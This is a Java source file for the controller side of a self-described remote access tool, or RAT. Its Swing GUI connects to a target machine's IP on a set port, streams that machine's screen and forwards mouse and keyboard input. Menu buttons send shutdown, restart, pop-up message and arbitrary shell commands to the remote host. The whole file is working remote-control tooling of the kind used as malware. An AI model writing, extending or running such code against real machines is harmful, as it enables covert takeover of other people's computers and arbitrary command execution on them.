package RAT.RAT;

import java.awt.GridBagLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.Inet4Address;
import java.net.Socket;

import javax.imageio.ImageIO;
import javax.swing.BorderFactory;
import javax.swing.GroupLayout;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JMenu;
import javax.swing.JMenuBar;
import javax.swing.JOptionPane;
import javax.swing.JPanel;

import RAT.RAT.*;
/*
 * @Date: Unknown
 * @Author: Liam Gardner
 * @Purpose: Things depend on it :)
 */
public class Dependancies {
    JPanel jp1;
    public JPanel jp2;
    GroupLayout jp1_L;
    GroupLayout jp2_L;
    JMenuBar menubar;
    JMenu RAT;
    JMenu cmds;
    JButton connect;
    JButton disconnect;
    JButton changePort;
    JButton quit;
    JButton shutdown;
    JButton restart;
    JButton msgbox;
    JButton custom;
    boolean connected = false;
    int port = 23610;
    Socket sock;
    public static String curcmd = "-1\n-1\n-1\n-1\n-1";

    ImageIcon connectIcon = new ImageIcon(getClass().getResource("/connect.png"));
    ImageIcon disconnectIcon = new ImageIcon(getClass().getResource("/disconnect.png"));
    ImageIcon portIcon = new ImageIcon(getClass().getResource("/port.png"));
    ImageIcon closeIcon = new ImageIcon(getClass().getResource("/close.png"));
    ImageIcon shutdownIcon = new ImageIcon(getClass().getResource("/shutdown.png"));
    ImageIcon restartIcon = new ImageIcon(getClass().getResource("/restart.png"));
    ImageIcon msgboxIcon = new ImageIcon(getClass().getResource("/message.png"));
    ImageIcon cmdIcon = new ImageIcon(getClass().getResource("/cmd.png"));

    public Dependancies(JFrame f){
        System.out.println(connectIcon);
        //Initialize all variables
        this.jp1 = new JPanel();
        this.jp2 = new JPanel();
        this.jp1_L = new GroupLayout(jp1);
        this.jp2_L = new GroupLayout(jp2);
        this.menubar = new JMenuBar();
        this.RAT = new JMenu();
        this.cmds = new JMenu();
        this.connect = new JButton();
        this.disconnect = new JButton();
        this.changePort = new JButton();
        this.quit = new JButton();
        this.shutdown = new JButton();
        this.restart = new JButton();
        this.msgbox = new JButton();
        this.custom = new JButton();

        //settings

        this.jp1.setLayout(this.jp1_L);
        this.jp1_L.setHorizontalGroup(this.jp1_L.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(GroupLayout.Alignment.TRAILING, this.jp1_L.createSequentialGroup().addContainerGap().addComponent(this.jp2, GroupLayout.DEFAULT_SIZE, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE).addContainerGap()));
        this.jp1_L.setVerticalGroup(this.jp1_L.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(this.jp1_L.createSequentialGroup().addContainerGap().addContainerGap().addComponent(this.jp2, GroupLayout.DEFAULT_SIZE, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE).addContainerGap()));
        this.jp1.addKeyListener(new KeyControl());
        
        this.jp2.setBorder(BorderFactory.createEtchedBorder());
        this.jp2.setLayout(this.jp2_L);
        this.jp2.addMouseMotionListener(new MouseMotionControl());
        this.jp2.addMouseListener(new MouseControl());
        this.jp2.addMouseWheelListener(new MouseWheelControl());
        this.jp2.addKeyListener(new KeyControl());
        this.jp2_L.setHorizontalGroup(this.jp2_L.createParallelGroup(GroupLayout.Alignment.LEADING).addGap(0, 806, Short.MAX_VALUE));
        this.jp2_L.setVerticalGroup(this.jp2_L.createParallelGroup(GroupLayout.Alignment.LEADING).addGap(0, 486, Short.MAX_VALUE));

        this.RAT.setText("R.A.T");
        this.cmds.setText("Commands");
        
        this.menubar.setLayout(new GridBagLayout());
        this.menubar.addKeyListener(new KeyControl());
        //this.connect.setText("Connect");
        this.connect.setIcon(connectIcon);
        this.connect.setToolTipText("Connect");
        this.connect.setContentAreaFilled(false);
        this.connect.setBorderPainted(false);
        this.connect.addKeyListener(new KeyControl());
        
        this.disconnect.setIcon(disconnectIcon);
        this.disconnect.setToolTipText("Disconnect");
        this.disconnect.setContentAreaFilled(false);
        this.disconnect.setBorderPainted(false);
        this.disconnect.addKeyListener(new KeyControl());
        
        this.changePort.setIcon(portIcon);
        this.changePort.setToolTipText("Change Port");
        this.changePort.setContentAreaFilled(false);
        this.changePort.setBorderPainted(false);
        this.changePort.addKeyListener(new KeyControl());
        
        this.quit.setIcon(closeIcon);
        this.quit.setToolTipText("Close Program");
        this.quit.setContentAreaFilled(false);
        this.quit.setBorderPainted(false);
        this.quit.addKeyListener(new KeyControl());
        
        this.connect.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                //CustomAction_Connect(e);
                Action_Connect(e);
            }
        });
        this.disconnect.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                Action_Disconnect(e);
            }
        });
        this.changePort.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                try{
                    int newPort = Integer.parseInt(JOptionPane.showInputDialog("New Port: "));
                    port = newPort;
                }catch (Exception e1){
                    JOptionPane.showMessageDialog(null, "Invalid port entered");
                }
            }
        });

        this.quit.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                System.exit(0);
            }
        });

        this.menubar.add(this.connect);
        this.menubar.add(this.disconnect);
        this.menubar.add(this.changePort);
        this.menubar.add(this.quit);
        
        this.shutdown.setIcon(shutdownIcon);
        this.shutdown.setToolTipText("Shutdown Computer");
        this.shutdown.setContentAreaFilled(false);
        this.shutdown.setBorderPainted(false);
        this.shutdown.addKeyListener(new KeyControl());
        
        this.restart.setIcon(restartIcon);
        this.restart.setToolTipText("Restart Computer");
        this.restart.setContentAreaFilled(false);
        this.restart.setBorderPainted(false);
        this.restart.addKeyListener(new KeyControl());
        
        this.msgbox.setIcon(msgboxIcon);
        this.msgbox.setToolTipText("Message Box");
        this.msgbox.setContentAreaFilled(false);
        this.msgbox.setBorderPainted(false);
        this.msgbox.addKeyListener(new KeyControl());
        
        this.custom.setIcon(cmdIcon);
        this.custom.setToolTipText("Run Shell Command");
        this.custom.setContentAreaFilled(false);
        this.custom.setBorderPainted(false);
        this.custom.addKeyListener(new KeyControl());
        

        this.msgbox.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                Action_Msgbox(e);
            }
        });
        this.shutdown.addActionListener(new ActionListener() {
			
			@Override
			public void actionPerformed(ActionEvent e) {
				Action_Shutdown(e);
				
			}
		});
        
        this.restart.addActionListener(new ActionListener() {
			
			@Override
			public void actionPerformed(ActionEvent e) {
				Action_Restart(e);
				
			}
		});
        
        this.custom.addActionListener(new ActionListener() {
        	public void actionPerformed(ActionEvent e) {
        		Action_Custom_Command(e);
        	}
        });

        this.menubar.add(this.shutdown);
        this.menubar.add(this.restart);
        this.menubar.add(this.msgbox);
        this.menubar.add(this.custom);
        f.pack();

    }

    @SuppressWarnings("unused")
    // this method is sad that it wasn't used...
	private void CustomAction_Connect(ActionEvent evt){
        if (!this.connected){
            String ip = JOptionPane.showInputDialog("IP Address: ");
            if (ip != null && !ip.equals("")){
                this.connected = true;
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try{
                            sock = new Socket(ip, port);
                            while (connected){
                                BufferedImage img = ImageIO.read(sock.getInputStream());
                                jp2.getGraphics().drawImage(img, 0, 0, jp2.getWidth(), jp2.getHeight(), null);

                                try{
                                    Thread.sleep(10);
                                }catch (Exception e2){
                                    JOptionPane.showMessageDialog(null, e2);
                                }
                            }
                        }catch (IOException e1){
                            JOptionPane.showMessageDialog(null, "Invalid IP");
                        }
                    }
                }).start();
            }
        }else{
            JOptionPane.showMessageDialog(null, "Disconnect first.");
        }
    }
    /*
     * Name: Connect
     * Params: ActionEvent
     * Return: None
     */
    private void Action_Connect(ActionEvent evt){
        if (!this.connected){
            String ip = JOptionPane.showInputDialog("IP Address or Hostname:");
            if (ip != null && !ip.equals("")){
                this.connected = true;
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try{
                            while (connected){
                                sock = new Socket(Inet4Address.getByName(ip).getHostAddress(), port);
                                BufferedImage img = ImageIO.read(sock.getInputStream());
                                jp2.getGraphics().drawImage(img, 0, 0, jp2.getWidth(), jp2.getHeight(), null);
                                if (!curcmd.equals("-1\n-1\n-1\n-1\n-1")){
                                    OutputStream raw = sock.getOutputStream();
                                    BufferedOutputStream buffered = new BufferedOutputStream(raw);
                                    OutputStreamWriter out = new OutputStreamWriter(buffered, "ASCII");
                                    String[] alpha = curcmd.split("\n");
                                    System.out.println(alpha[0]+" "+alpha[1]+" "+alpha[2]+" "+alpha[3]);
                                    out.write(curcmd);
                                    out.close();
                                    buffered.close();
                                    raw.close();
                                    curcmd = "-1\n-1\n-1\n-1\n-1";
                                }
                                sock.close();
                                try{
                                    Thread.sleep(10);
                                }catch(Exception e2){
                                    JOptionPane.showMessageDialog(null, e2);
                                }
                            }
                        }catch (IOException e1){
                            JOptionPane.showMessageDialog(null, "Invalid IP");
                        }
                    }
                }).start();
            }
        }else{
            JOptionPane.showMessageDialog(null, "Please Disconnect");
        }
    }
    /*
     * Name: Disconnect
     * Params: Action Event
     * Return: None
     */
    private void Action_Disconnect(ActionEvent evt){
        this.connected = false;
        try {
            this.sock.close();
        }catch (IOException e){
            JOptionPane.showMessageDialog(null, "Unable to disconnect");
        }
        this.connected = false;
    }
    /*
     * Name: Messagebox
     * Params: ActionEvent
     * Return: None
     */
    private void Action_Msgbox(ActionEvent evt){
        String msg = JOptionPane.showInputDialog("Message: ");
        changeEvent("MSGBOX: "+msg);
    }
    /*
     * Name: Custom Command
     * Params: ActionEvent
     * Return: None
     */
    private void Action_Custom_Command(ActionEvent evt){
        String cmd = JOptionPane.showInputDialog("Command: ");
        changeEvent("CMD: " + cmd);
    }
    /*
     * Name: Shutdown
     * Params: ActionEvent
     * Return: None
     */
    private void Action_Shutdown(ActionEvent evt) {
    	changeEvent("CMD: SHUTDOWN");
    }
    /*
     * Name: Restart
     * Params: ActionEvent
     * Return: None
     */
    private void Action_Restart(ActionEvent evt) {
    	changeEvent("CMD: RESTART");
    }

    @SuppressWarnings("unused")
    //this method is also sad that it wasn't use
	private boolean check_connection(String IP){
        Socket s;
        try{
            s = new Socket(IP, this.port);
            s.close();
            return true;
        }catch (Exception e){
            return false;
        }
    }
    /*
     * Name: Get JPanel 1
     * Params: None
     * Return: JPanel
     */
    public JPanel getJp1() {
        return jp1;
    }
    /*
     * Name: Get JPanel 2
     * Params: None
     * Return: JPanel
     */
    public JPanel getJp2() {
        return jp2;
    }
    //I'm not adding method headers for getters and setters
    public GroupLayout getJp1_L() {
        return jp1_L;
    }

    public GroupLayout getJp2_L() {
        return jp2_L;
    }

    public JMenuBar getMenubar() {
        return menubar;
    }

    public JMenu getRAT() {
        return RAT;
    }

    public JMenu getCmds() {
        return cmds;
    }

    public JButton getConnect() {
        return connect;
    }

    public JButton getDisconnect() {
        return disconnect;
    }

    public JButton getShutdown() {
        return shutdown;
    }

    public JButton getRestart() {
        return restart;
    }

    public JButton getMsgbox() {
        return msgbox;
    }

    public JButton getCustom() {
        return custom;
    }

    public boolean isConnected() {
        return connected;
    }

    public int getPort() {
        return port;
    }
    public void setPort(int np){
        this.port = np;
    }
    
    /*
     * Name: Rebuild
     * Params: Event string, mouse x, mouse y, mouse button, key pressed
     * Return: None
     */
    @SuppressWarnings("static-access")
	public void rebuild(String event, int x, int y, int m, String key){
        this.curcmd = event+"\n"+Integer.toString(x)+"\n"+Integer.toString(y)+"\n"+Integer.toString(m)+"\n"+key;
    }
    /*
     * Name: Change Event
     * Params: String Event
     * Return: None
     */
    public static void changeEvent(String ev){
        String[] a = curcmd.split("\n");
        curcmd = ev+"\n"+a[1]+"\n"+a[2]+"\n"+a[3]+"\n"+a[4];
    }
    /*
     * Name: Change Mouse Coordinates
     * Params: int x position, int y position
     * Return: None
     */
    public static void changeCoords(int x, int y){
        String[] a = curcmd.split("\n");
        curcmd = a[0]+"\n"+Integer.toString(x)+"\n"+Integer.toString(y)+"\n"+a[3]+"\n"+a[4];
    }
    /*
     * Name: Change Press
     * Params: int mouse button
     * Return: None
     */
    public static void changePress(int m){
        String[] a = curcmd.split("\n");
        curcmd = a[0]+"\n"+a[1]+"\n"+a[2]+"\n"+Integer.toString(m)+"\n"+a[4];
    }
    /*
     * Name: Change Coordinates and button
     * Params: int x coordinate, int y coordinate, int mouse button
     * Return: None
     */
    public static void changeCPress(int x, int y, int m){
        String[] a = curcmd.split("\n");
        curcmd = a[0]+"\n"+Integer.toString(x)+"\n"+Integer.toString(y)+"\n"+Integer.toString(m)+"\n"+a[4];
    }
    /*
     * Name: Change Key
     * Params: int keycode or String Keycode
     * Return: None
     */
    public static void changeKey(int k){
        String[] a = curcmd.split("\n");
        curcmd = a[0]+"\n"+a[1]+"\n"+a[2]+"\n"+a[3]+"\n"+Integer.toString(k);
    }
    public static void changeKey(String k){
        String[] a = curcmd.split("\n");
        curcmd = a[0]+"\n"+a[1]+"\n"+a[2]+"\n"+a[3]+"\n"+k;
    }
}
